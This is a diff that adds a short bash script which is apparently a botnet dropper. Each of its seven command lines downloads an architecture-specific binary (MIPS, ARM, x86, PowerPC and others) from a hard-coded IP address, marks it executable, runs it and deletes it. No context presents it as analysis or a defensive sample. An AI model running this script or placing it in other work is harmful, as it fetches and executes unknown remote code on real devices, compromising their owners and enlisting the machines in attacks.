@@ -1,0 +1,8 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.191.104.52/elf.mips; chmod +x elf.mips; ./elf.mips; rm -rf elf.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.191.104.52/elf.mpsl; chmod +x elf.mpsl; ./elf.mpsl; rm -rf elf.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.191.104.52/elf.x86; chmod +x elf.x86; ./elf.x86; rm -rf elf.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.191.104.52/elf.arm; chmod +x elf.arm; ./elf.arm; rm -rf elf.arm
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.191.104.52/elf.i686; chmod +x elf.i686; ./elf.i686; rm -rf elf.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.191.104.52/elf.ppc; chmod +x elf.ppc; ./elf.ppc; rm -rf elf.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.191.104.52/elf.i586; chmod +x elf.i586; ./elf.i586; rm -rf elf.i586
